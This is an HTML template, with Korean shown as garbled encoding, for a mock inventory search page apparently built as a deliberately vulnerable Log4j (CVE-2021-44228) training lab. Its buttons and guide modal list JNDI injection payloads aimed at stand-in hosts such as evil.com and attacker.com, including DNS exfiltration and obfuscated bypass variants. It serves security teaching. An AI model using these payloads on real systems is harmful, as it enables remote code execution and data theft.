<!DOCTYPE html>
<html lang="ko" xmlns:th="http://www.thymeleaf.org">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ì¬ê³  ì¡°íšŒ - SecureLogistics</title>

    <!-- Bootstrap 5 CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <!-- Font Awesome Icons -->
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
      rel="stylesheet"
    />
    <!-- DataTables CSS -->
    <link
      href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css"
      rel="stylesheet"
    />

    <!-- Custom CSS -->
    <style>
      :root {
        --logistics-primary: #2c3e50;
        --logistics-secondary: #3498db;
        --logistics-success: #27ae60;
        --logistics-warning: #f39c12;
        --logistics-danger: #e74c3c;
      }

      body {
        background-color: #f8f9fa;
      }

      .page-header {
        background: linear-gradient(135deg, #27ae60, #2ecc71);
        color: white;
        padding: 2rem 0;
        margin-bottom: 2rem;
      }

      .vulnerability-banner {
        background: linear-gradient(45deg, #e74c3c, #ff6b6b);
        color: white;
        padding: 1.5rem;
        border-radius: 15px;
        margin-bottom: 2rem;
        box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
      }

      .search-container {
        background: white;
        border-radius: 20px;
        padding: 2rem;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
        margin-bottom: 2rem;
      }

      .search-input {
        border-radius: 50px;
        padding: 1rem 1.5rem;
        border: 3px solid #e9ecef;
        font-size: 1.1rem;
        transition: all 0.3s ease;
      }

      .search-input:focus {
        border-color: var(--logistics-success);
        box-shadow: 0 0 0 0.3rem rgba(39, 174, 96, 0.25);
        transform: scale(1.02);
      }

      .search-btn {
        border-radius: 50px;
        padding: 1rem 2rem;
        font-weight: bold;
        font-size: 1.1rem;
        transition: all 0.3s ease;
      }

      .search-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
      }

      .filter-card {
        background: white;
        border-radius: 15px;
        padding: 1.5rem;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
        margin-bottom: 1.5rem;
        transition: transform 0.3s ease;
      }

      .filter-card:hover {
        transform: translateY(-3px);
      }

      .result-card {
        background: white;
        border-radius: 15px;
        padding: 1.5rem;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
        margin-bottom: 1rem;
        transition: all 0.3s ease;
      }

      .result-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
      }

      .stock-status {
        padding: 0.5rem 1rem;
        border-radius: 20px;
        font-weight: bold;
        font-size: 0.9rem;
      }

      .stock-high {
        background: #d4edda;
        color: #155724;
      }
      .stock-medium {
        background: #fff3cd;
        color: #856404;
      }
      .stock-low {
        background: #f8d7da;
        color: #721c24;
      }
      .stock-out {
        background: #f5c6cb;
        color: #721c24;
      }

      .attack-pattern-btn {
        margin: 0.2rem;
        border-radius: 20px;
        font-size: 0.85rem;
        transition: all 0.3s ease;
      }

      .attack-pattern-btn:hover {
        transform: scale(1.05);
      }

      .real-time-search {
        border-left: 4px solid var(--logistics-success);
        background: #f8fff9;
        padding: 1rem;
        margin: 1rem 0;
        border-radius: 5px;
      }

      .vulnerability-demo {
        background: linear-gradient(45deg, #ff9a56, #ff6b6b);
        border-radius: 15px;
        padding: 1.5rem;
        margin: 1rem 0;
      }

      .log-monitor {
        background: #1a1a1a;
        color: #00ff00;
        border-radius: 10px;
        padding: 1rem;
        font-family: 'Courier New', monospace;
        font-size: 0.85rem;
        max-height: 300px;
        overflow-y: auto;
        margin: 1rem 0;
      }

      .category-tag {
        background: var(--logistics-secondary);
        color: white;
        padding: 0.3rem 0.8rem;
        border-radius: 15px;
        font-size: 0.8rem;
        margin: 0.2rem;
        display: inline-block;
      }

      .advanced-search {
        background: #f8f9fa;
        border-radius: 10px;
        padding: 1.5rem;
        margin-bottom: 1rem;
      }
    </style>
  </head>
  <body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
      <div class="container">
        <a class="navbar-brand" href="/">
          <i class="fas fa-truck-moving me-2"></i>
          SecureLogistics
        </a>
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarNav"
        >
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav me-auto">
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="fas fa-home me-1"></i>ëŒ€ì‹œë³´ë“œ
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/warehouse">
                <i class="fas fa-warehouse me-1"></i>ì…ê³ ê´€ë¦¬
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/shipping">
                <i class="fas fa-shipping-fast me-1"></i>ì¶œê³ ê´€ë¦¬
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link active" href="/inventory">
                <i class="fas fa-boxes me-1"></i>ì¬ê³ ì¡°íšŒ
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/tracking">
                <i class="fas fa-route me-1"></i>ë°°ì†¡ì¶”ì 
              </a>
            </li>
          </ul>
          <ul class="navbar-nav">
            <li class="nav-item dropdown">
              <a
                class="nav-link dropdown-toggle"
                href="#"
                role="button"
                data-bs-toggle="dropdown"
              >
                <i class="fas fa-cog me-1"></i>ì‹œìŠ¤í…œê´€ë¦¬
              </a>
              <ul class="dropdown-menu">
                <li>
                  <a class="dropdown-item" href="/admin/users">ì§ì›ê´€ë¦¬</a>
                </li>
                <li>
                  <a class="dropdown-item" href="/admin/logs">ì‹œìŠ¤í…œë¡œê·¸</a>
                </li>
                <li><hr class="dropdown-divider" /></li>
                <li>
                  <a class="dropdown-item text-warning" href="/vulnerable">
                    <i class="fas fa-bug me-1"></i>ì·¨ì•½ì  ì‹¤ìŠµ
                  </a>
                </li>
              </ul>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <!-- Page Header -->
    <section class="page-header">
      <div class="container">
        <div class="row align-items-center">
          <div class="col-md-8">
            <h1 class="display-5 fw-bold">
              <i class="fas fa-search me-3"></i>ì‹¤ì‹œê°„ ì¬ê³  ì¡°íšŒ ì‹œìŠ¤í…œ
            </h1>
            <p class="lead">í†µí•© ê²€ìƒ‰ìœ¼ë¡œ ëª¨ë“  ì¬ê³  ì •ë³´ë¥¼ í•œëˆˆì— í™•ì¸í•˜ì„¸ìš”</p>
          </div>
          <div class="col-md-4 text-end">
            <div class="text-white">
              <h4><i class="fas fa-cubes me-2"></i>ì´ ì¬ê³ </h4>
              <h2 class="fw-bold">15,847</h2>
              <small>í’ˆëª©</small>
            </div>
          </div>
        </div>
      </div>
    </section>

    <div class="container">
      <!-- Vulnerability Banner -->
      <div class="vulnerability-banner">
        <div class="row align-items-center">
          <div class="col-md-8">
            <h3 class="mb-2">
              <i class="fas fa-shield-alt me-2"></i>
              Log4j ì·¨ì•½ì  ì‹¤ìŠµ í™˜ê²½
            </h3>
            <p class="mb-0">
              ì´ ê²€ìƒ‰ ì‹œìŠ¤í…œì€ Log4j CVE-2021-44228 ì·¨ì•½ì  í•™ìŠµì„ ìœ„í•´
              ì˜ë„ì ìœ¼ë¡œ ì·¨ì•½í•˜ê²Œ êµ¬ì„±ë˜ì—ˆìŠµë‹ˆë‹¤.
            </p>
            <small
              >ğŸ¯ ê²€ìƒ‰ì°½ì— JNDI ê³µê²© íŒ¨í„´ì„ ì…ë ¥í•˜ì—¬ ì‹¤ì‹œê°„ìœ¼ë¡œ ì·¨ì•½ì ì„ ì‹¤ìŠµí• 
              ìˆ˜ ìˆìŠµë‹ˆë‹¤.</small
            >
          </div>
          <div class="col-md-4 text-end">
            <button
              class="btn btn-outline-light btn-lg"
              onclick="showAttackGuide()"
            >
              <i class="fas fa-graduation-cap me-2"></i>ì‹¤ìŠµ ê°€ì´ë“œ
            </button>
          </div>
        </div>
      </div>

      <!-- Main Search Section -->
      <div class="search-container">
        <div class="text-center mb-4">
          <h3 class="fw-bold">
            <i class="fas fa-search-location me-2 text-success"></i>
            ìŠ¤ë§ˆíŠ¸ ì¬ê³  ê²€ìƒ‰
          </h3>
          <p class="text-muted">
            ìƒí’ˆëª…, SKU, ì¹´í…Œê³ ë¦¬, ê³µê¸‰ì—…ì²´ ë“± ëª¨ë“  ì •ë³´ë¥¼ í†µí•© ê²€ìƒ‰í•©ë‹ˆë‹¤
          </p>
        </div>

        <!-- Main Search Bar -->
        <div class="row justify-content-center mb-4">
          <div class="col-md-8">
            <div class="input-group input-group-lg">
              <input
                type="text"
                class="form-control search-input"
                id="mainSearchInput"
                placeholder="ì¬ê³  ê²€ìƒ‰ì–´ë¥¼ ì…ë ¥í•˜ì„¸ìš”... (ì˜ˆ: ì‚¼ì„± ê°¤ëŸ­ì‹œ, SKU-12345, ìŠ¤ë§ˆíŠ¸í°)"
              />
              <button
                class="btn btn-success search-btn"
                onclick="performMainSearch()"
              >
                <i class="fas fa-search me-2"></i>ê²€ìƒ‰
              </button>
            </div>
            <div class="form-text text-center mt-2">
              <span class="text-warning">âš ï¸ Log4j ì·¨ì•½ì  ì‹¤ìŠµ:</span>
              JNDI íŒ¨í„´ì„ ì…ë ¥í•˜ì—¬ ë³´ì•ˆ ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•´ë³´ì„¸ìš”
            </div>
          </div>
        </div>

        <!-- Attack Pattern Quick Buttons -->
        <div class="text-center mb-4">
          <h6 class="text-muted mb-3">
            ğŸš¨ ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ íŒ¨í„´ (í´ë¦­í•˜ì—¬ ë¹ ë¥¸ ì…ë ¥)
          </h6>
          <div class="d-flex flex-wrap justify-content-center gap-2">
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:ldap://evil.com/exploit}')"
            >
              ê¸°ë³¸ LDAP ê³µê²©
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:rmi://malicious.server/payload}')"
            >
              RMI ê³µê²©
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:dns://attacker.com/exfiltrate}')"
            >
              DNS ê³µê²©
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${${lower:jndi}:${lower:ldap}://bypass.com/exploit}')"
            >
              ìš°íšŒ ê³µê²©
            </button>
            <button
              class="btn btn-outline-warning btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('ì •ìƒê²€ìƒ‰ì–´')"
            >
              ì •ìƒ ê²€ìƒ‰
            </button>
          </div>
        </div>

        <!-- Real-time Search Alert -->
        <div class="real-time-search" id="searchAlert" style="display: none">
          <div class="row align-items-center">
            <div class="col-md-8">
              <h6 class="mb-1">
                <i class="fas fa-bolt text-warning me-2"></i>
                ì‹¤ì‹œê°„ ê²€ìƒ‰ í™œì„±í™”
              </h6>
              <p class="mb-0">ì…ë ¥í•˜ëŠ” ëª¨ë“  ë‚´ìš©ì´ ì‹¤ì‹œê°„ìœ¼ë¡œ ë¡œê¹…ë©ë‹ˆë‹¤.</p>
            </div>
            <div class="col-md-4 text-end">
              <span class="badge bg-success">Log4j í™œì„±</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Advanced Search & Filters -->
      <div class="row">
        <div class="col-lg-8">
          <!-- Advanced Search -->
          <div class="filter-card">
            <h5 class="mb-3"><i class="fas fa-sliders-h me-2"></i>ê³ ê¸‰ ê²€ìƒ‰</h5>
            <div class="advanced-search">
              <div class="row">
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">ì¹´í…Œê³ ë¦¬</label>
                    <select class="form-select" id="categoryFilter">
                      <option value="">ì „ì²´ ì¹´í…Œê³ ë¦¬</option>
                      <option value="electronics">ì „ìì œí’ˆ</option>
                      <option value="appliances">ê°€ì „ì œí’ˆ</option>
                      <option value="furniture">ê°€êµ¬</option>
                      <option value="clothing">ì˜ë¥˜</option>
                    </select>
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">ì¬ê³  ìƒíƒœ</label>
                    <select class="form-select" id="stockFilter">
                      <option value="">ëª¨ë“  ìƒíƒœ</option>
                      <option value="high">ì¶©ë¶„ (100ê°œ ì´ìƒ)</option>
                      <option value="medium">ë³´í†µ (50-99ê°œ)</option>
                      <option value="low">ë¶€ì¡± (10-49ê°œ)</option>
                      <option value="out">í’ˆì ˆ (0ê°œ)</option>
                    </select>
                  </div>
                </div>
              </div>
              <div class="row">
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">ê³µê¸‰ì—…ì²´</label>
                    <input
                      type="text"
                      class="form-control"
                      id="supplierFilter"
                      placeholder="ê³µê¸‰ì—…ì²´ëª… ì…ë ¥..."
                    />
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">ê°€ê²© ë²”ìœ„</label>
                    <div class="input-group">
                      <input
                        type="number"
                        class="form-control"
                        id="priceMin"
                        placeholder="ìµœì†Œ"
                      />
                      <span class="input-group-text">~</span>
                      <input
                        type="number"
                        class="form-control"
                        id="priceMax"
                        placeholder="ìµœëŒ€"
                      />
                    </div>
                  </div>
                </div>
              </div>
              <div class="text-center">
                <button
                  class="btn btn-primary me-2"
                  onclick="performAdvancedSearch()"
                >
                  <i class="fas fa-filter me-1"></i>í•„í„° ì ìš©
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="resetFilters()"
                >
                  <i class="fas fa-undo me-1"></i>ì´ˆê¸°í™”
                </button>
              </div>
            </div>
          </div>

          <!-- Search Results -->
          <div class="filter-card">
            <div class="d-flex justify-content-between align-items-center mb-3">
              <h5 class="mb-0">
                <i class="fas fa-list me-2"></i>ê²€ìƒ‰ ê²°ê³¼
                <span class="badge bg-primary ms-2" id="resultCount">3</span>
              </h5>
              <div class="btn-group btn-group-sm">
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('name')"
                >
                  <i class="fas fa-sort-alpha-down me-1"></i>ì´ë¦„ìˆœ
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('stock')"
                >
                  <i class="fas fa-sort-numeric-down me-1"></i>ì¬ê³ ìˆœ
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('price')"
                >
                  <i class="fas fa-sort-amount-down me-1"></i>ê°€ê²©ìˆœ
                </button>
              </div>
            </div>

            <!-- Sample Results -->
            <div id="searchResults">
              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=ìƒí’ˆ"
                      class="img-fluid rounded"
                      alt="ìƒí’ˆì´ë¯¸ì§€"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">ì‚¼ì„± ê°¤ëŸ­ì‹œ S24 Ultra</h6>
                    <p class="text-muted mb-1">SKU: SAM-GAL-S24U-001</p>
                    <div class="mb-2">
                      <span class="category-tag">ìŠ¤ë§ˆíŠ¸í°</span>
                      <span class="category-tag">ì‚¼ì„±</span>
                    </div>
                    <small class="text-muted">ê³µê¸‰ì—…ì²´: ì‚¼ì„±ì „ì</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-high">ì¬ê³  ì¶©ë¶„</span>
                    <h5 class="fw-bold mt-2">247ê°œ</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">1,200,000ì›</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>ìƒì„¸ë³´ê¸°
                    </button>
                  </div>
                </div>
              </div>

              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=ìƒí’ˆ"
                      class="img-fluid rounded"
                      alt="ìƒí’ˆì´ë¯¸ì§€"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">LG ì˜¬ë ˆë“œ TV 65ì¸ì¹˜</h6>
                    <p class="text-muted mb-1">SKU: LG-OLED-65C3-001</p>
                    <div class="mb-2">
                      <span class="category-tag">TV</span>
                      <span class="category-tag">LG</span>
                    </div>
                    <small class="text-muted">ê³µê¸‰ì—…ì²´: LGì „ì</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-low">ì¬ê³  ë¶€ì¡±</span>
                    <h5 class="fw-bold mt-2 text-warning">12ê°œ</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">2,500,000ì›</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>ìƒì„¸ë³´ê¸°
                    </button>
                  </div>
                </div>
              </div>

              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=ìƒí’ˆ"
                      class="img-fluid rounded"
                      alt="ìƒí’ˆì´ë¯¸ì§€"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">ì• í”Œ ë§¥ë¶ í”„ë¡œ 16ì¸ì¹˜</h6>
                    <p class="text-muted mb-1">SKU: APP-MBP-16-M3-001</p>
                    <div class="mb-2">
                      <span class="category-tag">ë…¸íŠ¸ë¶</span>
                      <span class="category-tag">ì• í”Œ</span>
                    </div>
                    <small class="text-muted">ê³µê¸‰ì—…ì²´: ì• í”Œì½”ë¦¬ì•„</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-medium">ì¬ê³  ë³´í†µ</span>
                    <h5 class="fw-bold mt-2">67ê°œ</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">3,200,000ì›</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>ìƒì„¸ë³´ê¸°
                    </button>
                  </div>
                </div>
              </div>
            </div>

            <!-- Pagination -->
            <nav class="mt-4">
              <ul class="pagination justify-content-center">
                <li class="page-item disabled">
                  <a class="page-link" href="#">ì´ì „</a>
                </li>
                <li class="page-item active">
                  <a class="page-link" href="#">1</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">2</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">3</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">ë‹¤ìŒ</a>
                </li>
              </ul>
            </nav>
          </div>
        </div>

        <!-- Sidebar -->
        <div class="col-lg-4">
          <!-- Vulnerability Demo -->
          <div class="vulnerability-demo text-white">
            <h5 class="fw-bold mb-3">
              <i class="fas fa-bug me-2"></i>ì·¨ì•½ì  ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§
            </h5>
            <p class="mb-3">ê²€ìƒ‰í•  ë•Œë§ˆë‹¤ Log4j ë¡œê¹…ì´ ì‹¤í–‰ë©ë‹ˆë‹¤</p>
            <button
              class="btn btn-outline-light w-100"
              onclick="toggleLogMonitor()"
            >
              <i class="fas fa-terminal me-2"></i>ë¡œê·¸ ëª¨ë‹ˆí„° í† ê¸€
            </button>
          </div>

          <!-- Log Monitor -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-terminal me-2"></i>ì‹¤ì‹œê°„ ë¡œê·¸ ëª¨ë‹ˆí„°
            </h6>
            <div class="log-monitor" id="logMonitor">
              <div>
                [2025-05-27 15:30:15] INFO - Inventory search system initialized
              </div>
              <div>
                [2025-05-27 15:30:16] DEBUG - Log4j vulnerability demo mode
                active
              </div>
              <div>
                [2025-05-27 15:30:17] INFO - Search page accessed from IP:
                127.0.0.1
              </div>
              <div>
                [2025-05-27 15:30:18] WARN - Vulnerability monitoring enabled
              </div>
            </div>
            <div class="text-center mt-2">
              <button
                class="btn btn-outline-success btn-sm"
                onclick="clearLogs()"
              >
                <i class="fas fa-trash me-1"></i>ë¡œê·¸ ì§€ìš°ê¸°
              </button>
            </div>
          </div>

          <!-- Quick Stats -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-chart-pie me-2"></i>ì¬ê³  í˜„í™©
            </h6>
            <div class="row text-center">
              <div class="col-6 mb-3">
                <div class="text-success">
                  <i class="fas fa-check-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">12,456</h4>
                  <small>ì¶©ë¶„</small>
                </div>
              </div>
              <div class="col-6 mb-3">
                <div class="text-warning">
                  <i class="fas fa-exclamation-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">2,134</h4>
                  <small>ë¶€ì¡±</small>
                </div>
              </div>
              <div class="col-6">
                <div class="text-danger">
                  <i class="fas fa-times-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">567</h4>
                  <small>í’ˆì ˆ</small>
                </div>
              </div>
              <div class="col-6">
                <div class="text-info">
                  <i class="fas fa-plus-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">690</h4>
                  <small>ì‹ ê·œ</small>
                </div>
              </div>
            </div>
          </div>

          <!-- Popular Searches -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-fire me-2"></i>ì¸ê¸° ê²€ìƒ‰ì–´
            </h6>
            <div class="d-flex flex-wrap gap-1">
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('ì‚¼ì„±')"
              >
                ì‚¼ì„±
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('LG')"
              >
                LG
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('ì• í”Œ')"
              >
                ì• í”Œ
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('ìŠ¤ë§ˆíŠ¸í°')"
              >
                ìŠ¤ë§ˆíŠ¸í°
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('ë…¸íŠ¸ë¶')"
              >
                ë…¸íŠ¸ë¶
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('TV')"
              >
                TV
              </button>
              <button
                class="btn btn-outline-danger btn-sm"
                onclick="quickSearch('${jndi:ldap://test.com}')"
              >
                ğŸš¨ í…ŒìŠ¤íŠ¸
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Attack Guide Modal -->
    <div class="modal fade" id="attackGuideModal" tabindex="-1">
      <div class="modal-dialog modal-xl">
        <div class="modal-content">
          <div class="modal-header bg-danger text-white">
            <h5 class="modal-title">
              <i class="fas fa-graduation-cap me-2"></i>Log4j ì·¨ì•½ì  ì‹¤ìŠµ ê°€ì´ë“œ
            </h5>
            <button
              type="button"
              class="btn-close btn-close-white"
              data-bs-dismiss="modal"
            ></button>
          </div>
          <div class="modal-body">
            <div class="row">
              <div class="col-md-6">
                <h6 class="fw-bold text-danger">ğŸ¯ ì‹¤ìŠµ ëª©í‘œ</h6>
                <ul>
                  <li>Log4j JNDI Injection ì·¨ì•½ì  ì´í•´</li>
                  <li>ë‹¤ì–‘í•œ ê³µê²© íŒ¨í„´ ì‹¤ìŠµ</li>
                  <li>ì‹¤ì‹œê°„ ë¡œê·¸ ëª¨ë‹ˆí„°ë§</li>
                  <li>ë³´ì•ˆ ì·¨ì•½ì  íƒì§€ ë°©ë²• í•™ìŠµ</li>
                </ul>

                <h6 class="fw-bold text-primary mt-4">ğŸ“‹ ì‹¤ìŠµ ì ˆì°¨</h6>
                <ol>
                  <li>ì•„ë˜ ê³µê²© íŒ¨í„´ ì¤‘ í•˜ë‚˜ ì„ íƒ</li>
                  <li>ê²€ìƒ‰ì°½ì— ë³µì‚¬í•˜ì—¬ ë¶™ì—¬ë„£ê¸°</li>
                  <li>ê²€ìƒ‰ ì‹¤í–‰</li>
                  <li>ë¡œê·¸ ëª¨ë‹ˆí„°ì—ì„œ ê²°ê³¼ í™•ì¸</li>
                  <li>ë‹¤ë¥¸ íŒ¨í„´ìœ¼ë¡œ ë°˜ë³µ ì‹¤ìŠµ</li>
                </ol>
              </div>
              <div class="col-md-6">
                <h6 class="fw-bold text-warning">âš ï¸ ê³µê²© íŒ¨í„´ ëª©ë¡</h6>
                <div class="bg-dark text-light p-3 rounded">
                  <code>
                    # ê¸°ë³¸ LDAP ê³µê²©<br />
                    ${jndi:ldap://evil.com/exploit}<br /><br />

                    # RMI ê³µê²©<br />
                    ${jndi:rmi://malicious.server/payload}<br /><br />

                    # DNS ë°ì´í„° ìœ ì¶œ<br />
                    ${jndi:dns://attacker.com/exfiltrate}<br /><br />

                    # ìš°íšŒ ê¸°ë²•<br />
                    ${${lower:jndi}:${lower:ldap}://bypass.com/exploit}<br /><br />

                    # í™˜ê²½ë³€ìˆ˜ ìš°íšŒ<br />
                    ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}<br /><br />

                    # ì¤‘ì²© ìš°íšŒ<br />
                    ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}
                  </code>
                </div>
              </div>
            </div>

            <div class="alert alert-danger mt-4">
              <h6 class="fw-bold">ğŸš¨ ì¤‘ìš” ì£¼ì˜ì‚¬í•­</h6>
              <ul class="mb-0">
                <li>ì´ëŠ” <strong>êµìœ¡ ëª©ì </strong>ì˜ ì‹¤ìŠµ í™˜ê²½ì…ë‹ˆë‹¤</li>
                <li>
                  ì‹¤ì œ ìš´ì˜ ì‹œìŠ¤í…œì—ì„œëŠ” <strong>ì ˆëŒ€ ì‚¬ìš©í•˜ì§€ ë§ˆì„¸ìš”</strong>
                </li>
                <li>
                  ì´ í™˜ê²½ì€ <strong>ê²©ë¦¬ëœ ë„¤íŠ¸ì›Œí¬</strong>ì—ì„œë§Œ ì‚¬ìš©í•´ì•¼
                  í•©ë‹ˆë‹¤
                </li>
                <li>
                  ì‹¤ìŠµ í›„ì—ëŠ”
                  <strong>ë°˜ë“œì‹œ Log4jë¥¼ ì•ˆì „í•œ ë²„ì „ìœ¼ë¡œ ì—…ë°ì´íŠ¸</strong>í•˜ì„¸ìš”
                </li>
              </ul>
            </div>

            <div class="bg-info text-white p-3 rounded mt-3">
              <h6 class="fw-bold">ğŸ’¡ í•™ìŠµ í¬ì¸íŠ¸</h6>
              <p class="mb-0">
                ê° íŒ¨í„´ì„ ì‹¤í–‰í•  ë•Œë§ˆë‹¤ ë¡œê·¸ ëª¨ë‹ˆí„°ë¥¼ í™•ì¸í•˜ì—¬ Log4jê°€ ì–´ë–»ê²Œ
                JNDI ë¬¸ìì—´ì„ ì²˜ë¦¬í•˜ëŠ”ì§€ ê´€ì°°í•´ë³´ì„¸ìš”. ì‹¤ì œ ê³µê²©ì—ì„œëŠ” ì™¸ë¶€
                ì„œë²„ë¡œ ì—°ê²°ì„ ì‹œë„í•˜ê²Œ ë©ë‹ˆë‹¤.
              </p>
            </div>
          </div>
          <div class="modal-footer">
            <button
              type="button"
              class="btn btn-secondary"
              data-bs-dismiss="modal"
            >
              ë‹«ê¸°
            </button>
            <button
              type="button"
              class="btn btn-warning"
              onclick="startGuidedTour()"
            >
              <i class="fas fa-play me-1"></i>ê°€ì´ë“œ íˆ¬ì–´ ì‹œì‘
            </button>
            <button
              type="button"
              class="btn btn-danger"
              onclick="location.href='/vulnerable'"
            >
              <i class="fas fa-bug me-1"></i>ì „ìš© ì‹¤ìŠµì‹¤ë¡œ ì´ë™
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>

    <!-- Custom JavaScript -->
    <script>
      let searchCount = 0;
      let logMonitorVisible = true;

      // í˜ì´ì§€ ë¡œë“œ ì‹œ ì´ˆê¸°í™”
      document.addEventListener('DOMContentLoaded', function () {
        initializePage();
        setupRealTimeSearch();
        startLogSimulation();
      });

      // í˜ì´ì§€ ì´ˆê¸°í™”
      function initializePage() {
        // ê²€ìƒ‰ì°½ í¬ì»¤ìŠ¤
        document.getElementById('mainSearchInput').focus();

        // ê²€ìƒ‰ ì•Œë¦¼ í‘œì‹œ
        document.getElementById('searchAlert').style.display = 'block';

        // ì• ë‹ˆë©”ì´ì…˜ íš¨ê³¼
        animateCards();
      }

      // ì¹´ë“œ ì• ë‹ˆë©”ì´ì…˜
      function animateCards() {
        const cards = document.querySelectorAll(
          '.filter-card, .result-card, .vulnerability-banner'
        );
        cards.forEach((card, index) => {
          setTimeout(() => {
            card.style.opacity = '0';
            card.style.transform = 'translateY(20px)';
            card.style.transition = 'all 0.6s ease';
            setTimeout(() => {
              card.style.opacity = '1';
              card.style.transform = 'translateY(0)';
            }, 100);
          }, index * 100);
        });
      }

      // ğŸš¨ ë©”ì¸ ê²€ìƒ‰ ê¸°ëŠ¥ (Log4j ì·¨ì•½ì  ì‹¤ìŠµì˜ í•µì‹¬)
      function performMainSearch() {
        const searchTerm = document.getElementById('mainSearchInput').value;

        if (!searchTerm.trim()) {
          alert('ê²€ìƒ‰ì–´ë¥¼ ì…ë ¥í•´ì£¼ì„¸ìš”.');
          return;
        }

        searchCount++;
        addLogEntry(`[ê²€ìƒ‰ ${searchCount}] ê²€ìƒ‰ì–´: "${searchTerm}"`);

        // ğŸš¨ Log4j ì·¨ì•½ì : API í˜¸ì¶œë¡œ ì„œë²„ ë¡œê¹… íŠ¸ë¦¬ê±°
        fetch(
